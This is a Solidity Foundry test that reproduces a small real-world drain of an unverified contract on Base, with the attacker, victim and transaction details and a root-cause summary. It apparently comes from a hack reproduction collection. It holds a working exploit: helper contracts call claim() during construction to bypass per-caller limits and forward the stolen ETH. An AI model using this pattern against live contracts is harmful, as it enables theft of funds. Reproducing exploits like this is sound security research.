// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";

// @KeyInfo - Total Lost : 551.22 USD
// Attacker : 0xc0082433ac0928eCB63D9A1b87fDd8567F956f11
// Attack Contract : 0x7F05e20F02F92AC5801C410cb76D2F8531068208
// Vulnerable Contract : 0x91a1Dd68dc0bA6526d560ba9E9a3715E0634193D
// Attack Tx : https://basescan.org/tx/0x2d57862be191d62342b320bd3595b9a747fad10c7c3920ed86a2f7ac8a4c2cc7
//
// @Info
// Vulnerable Contract Code : unverified
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1197
//
// Attack summary: The attacker repeatedly deployed fresh helper contracts that called claim()
// during construction, received native ETH from the unverified victim, and forwarded it.
// Root cause: claim eligibility was tied to the caller address/code state, allowing
// constructor-time helper contracts to bypass the intended one-claim or contract-caller limit.

address constant VULNERABLE = 0x91a1dd68dC0Ba6526d560Ba9E9a3715E0634193D;

interface IUnverified91a1 {
    function claim() external returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    address payable private profitReceiver;

    function setUp() public {
        uint256 forkBlock = 30_841_258;
        vm.createSelectFork("base", forkBlock);

        profitReceiver = payable(makeAddr("profitReceiver"));
        attacker = profitReceiver;

        vm.label(VULNERABLE, "Unverified Victim");
    }

    function testExploit() public balanceLog {
        uint256 victimBalanceBefore = VULNERABLE.balance;
        uint256 receiverBalanceBefore = profitReceiver.balance;

        // step 1: claim repeatedly from fresh constructor-time helper addresses.
        uint256 successfulClaims;
        while (VULNERABLE.balance > 0) {
            try new ConstructorClaimHelper(profitReceiver) {
                successfulClaims++;
            } catch {
                break;
            }
        }

        // step 2: prove the constructor claims drained the victim and reached the profit receiver.
        uint256 profit = profitReceiver.balance - receiverBalanceBefore;
        assertGt(successfulClaims, 1);
        assertEq(VULNERABLE.balance, 0);
        assertEq(profit, victimBalanceBefore);
    }
}

contract ConstructorClaimHelper {
    constructor(
        address payable profitReceiver
    ) {
        IUnverified91a1(VULNERABLE).claim();

        (bool ok,) = profitReceiver.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    receive() external payable {}
}
